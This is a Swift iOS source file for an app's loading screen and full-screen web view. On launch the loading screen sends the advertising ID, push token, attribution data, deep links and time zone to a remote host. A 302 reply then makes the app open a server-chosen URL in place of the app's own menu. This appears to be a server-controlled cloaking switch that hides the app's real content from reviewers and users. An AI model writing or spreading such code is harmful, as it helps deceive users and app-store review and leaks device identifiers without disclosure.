import UIKit

class LoadingViewController: UIViewController, URLSessionDelegate {
    
    var logoImageView: UIImageView!
    var backgroundImageView: UIImageView!
    
    var appDelegate = UIApplication.shared.delegate as? AppDelegate
    
    var urlResponse = ""
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .portrait
    }
    
    var ourResponse = 1
    
    var timer: Timer?
    
    var secondsRemaining: Int = 0
    var squareViews: [UIView] = []
    var stackView: UIStackView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge], completionHandler: {
            success, error in
            guard success else {
                return
            }
            self.sendToRequest()
        })
        setupUI()
    }
    
    func setupUI() {
        backgroundImageView = UIImageView()
        backgroundImageView.image = UIImage(named: "background")
        backgroundImageView.translatesAutoresizingMaskIntoConstraints = false
        backgroundImageView.contentMode = .scaleToFill
        view.addSubview(backgroundImageView)
        
        NSLayoutConstraint.activate([
            backgroundImageView.topAnchor.constraint(equalTo: view.topAnchor),
            backgroundImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            backgroundImageView.leftAnchor.constraint(equalTo: view.leftAnchor),
            backgroundImageView.rightAnchor.constraint(equalTo: view.rightAnchor),
        ])
        
        logoImageView = UIImageView()
        logoImageView.image = UIImage(named: "logo")
        logoImageView.translatesAutoresizingMaskIntoConstraints = false
        logoImageView.contentMode = .scaleAspectFit
        view.addSubview(logoImageView)
        
        NSLayoutConstraint.activate([
            logoImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            logoImageView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerYAnchor),
            logoImageView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor),
            logoImageView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor),
        ])
        
        stackView = UIStackView()
        stackView.axis = .horizontal
        stackView.spacing = 10
        stackView.distribution = .fillEqually
        stackView.translatesAutoresizingMaskIntoConstraints = false
        
        for i in 0..<20 {
            let squareView = UIView()
            squareView.clipsToBounds = true
            squareView.layer.cornerRadius = 5
            squareView.tag = i
            squareView.backgroundColor = (i > Int(secondsRemaining)) ? .clear : UIColor(cgColor: CGColor(red: 166/255, green: 207/255, blue: 152/255, alpha: 1))
            squareView.translatesAutoresizingMaskIntoConstraints = false
            stackView.addArrangedSubview(squareView)
            squareViews.append(squareView)
        }
        
        view.addSubview(stackView)
        
        NSLayoutConstraint.activate([
            stackView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            stackView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -16),
            stackView.heightAnchor.constraint(equalToConstant: 50),
            stackView.widthAnchor.constraint(equalTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.95)
        ])
        timer = Timer.scheduledTimer(timeInterval: 0.1, target: self, selector: #selector(updateTimer), userInfo: nil, repeats: true)
    }
    
    //MARK: - updateTimer
    @objc func updateTimer() {
        self.secondsRemaining += 1
        for i in self.squareViews {
            i.backgroundColor = (i.tag > Int(self.secondsRemaining)) ? .clear : UIColor(cgColor: CGColor(red: 166/255, green: 207/255, blue: 152/255, alpha: 1))
        }
        if secondsRemaining > 20 {
            timer?.invalidate()
        }
    }
    
    func sendToRequest() {
        
        //MARK: Link to server
        
        let url = URL(string: "https://big-bamboo-emoji.fun/starting")
        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.facebookDeepLink, "push-token" : appDelegate?.token, "appsflyer" : appDelegate?.oldAndNotWorkingnaming, "deep_link_sub2" : appDelegate?.deep_link_sub2, "deepLinkStr": appDelegate?.deepLinkStr, "timezone-geo": appDelegate?.localizationTimeZoneAbbrtion, "timezome-gmt" : appDelegate?.currentTimeZone(), "apps-flyer-id": appDelegate!.id, "attribution-data" : appDelegate?.iDontKnowWhyButThisAttributionData, "deep_link_sub1" : appDelegate?.deep_link_sub1, "deep_link_sub3" : appDelegate?.deep_link_sub3, "deep_link_sub4" : appDelegate?.deep_link_sub4, "deep_link_sub5" : appDelegate?.deep_link_sub5]
        //MARK: Requset
        var request = URLRequest(url: url!)
        //MARK: JSON packing
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.idfa, forHTTPHeaderField: "GID")
        request.addValue(Bundle.main.bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.id, forHTTPHeaderField: "ID")
        
        //MARK: URLSession Configuration
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 30
        configuration.timeoutIntervalForRequest = 30
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        
        //MARK: Data Task
        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                self.showMenu()
                return
            }
            //MARK: HTTPURL Response
            if let response = response as? HTTPURLResponse {
                if response.statusCode == 302 {
                    if self.secondsRemaining < 20 {
                        self.timer?.invalidate()
                        //MARK: JSON Response
                        let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
                        if let responseJSON = responseJSON as? [String: Any] {
                            guard let result = responseJSON["result"] as? String else { return }
                            let webView = WebViewController()
                            webView.urlString = result
                            webView.modalPresentationStyle = .fullScreen
                            DispatchQueue.main.async {
                                self.present(webView, animated: true)
                            }
                        }
                    }
                } else  if response.statusCode == 200 {
                    self.showMenu()
                } else {
                    self.showMenu()
                }
            }
            return
        }
        task.resume()
    }
    
    func showMenu() {
        DispatchQueue.main.async {
            let vc = MenuViewController()
            vc.modalPresentationStyle = .fullScreen
            vc.modalTransitionStyle = .crossDissolve
            self.present(vc, animated: true)
        }
    }
    
    
    
}

import WebKit

class WebViewController: UIViewController, WKNavigationDelegate {
    
    var urlString = ""
    
    var delegate: UIViewController?
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .all
    }
    
    
    var webView: WKWebView!
    var reloadButton: UIButton!
    var backButton: UIButton!
    var buttonStackView: UIStackView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        webView = WKWebView()
        webView.navigationDelegate = self
        view.addSubview(webView)
        self.navigationController?.navigationBar.tintColor = .orange
        reloadButton = UIButton(type: .custom)
        reloadButton.imageView?.contentMode = .scaleAspectFit
        reloadButton.setImage(UIImage(systemName: "goforward"), for: .normal)
        reloadButton.tintColor = .orange
        reloadButton.addTarget(self, action: #selector(reloadPage), for: .touchUpInside)
        
        backButton = UIButton(type: .custom)
        backButton.imageView?.contentMode = .scaleAspectFit
        backButton.setImage(UIImage(systemName: "arrowshape.left"), for: .normal)
        backButton.tintColor = .orange
        backButton.addTarget(self, action: #selector(goBack), for: .touchUpInside)
        
        webView.translatesAutoresizingMaskIntoConstraints = false
        buttonStackView = UIStackView(arrangedSubviews: [reloadButton, backButton])
        buttonStackView.axis = .horizontal
        buttonStackView.spacing = 10
        buttonStackView.alignment = .center
        buttonStackView.distribution = .fillEqually
        view.addSubview(buttonStackView)
        buttonStackView.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -40),
            buttonStackView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            buttonStackView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            buttonStackView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            buttonStackView.topAnchor.constraint(equalTo: webView.bottomAnchor),
            backButton.topAnchor.constraint(equalTo: buttonStackView.topAnchor),
            backButton.bottomAnchor.constraint(equalTo: buttonStackView.bottomAnchor),
            reloadButton.topAnchor.constraint(equalTo: reloadButton.topAnchor),
            reloadButton.bottomAnchor.constraint(equalTo: reloadButton.bottomAnchor),
        ])
        
        if let url = URL(string: urlString) {
            let request = URLRequest(url: url)
            webView.load(request)
        }
    }
    
    @objc func goBack() {
        if webView.canGoBack {
            webView.goBack()
        }
    }
    
    @objc func reloadPage() {
        webView.reload()
    }
}
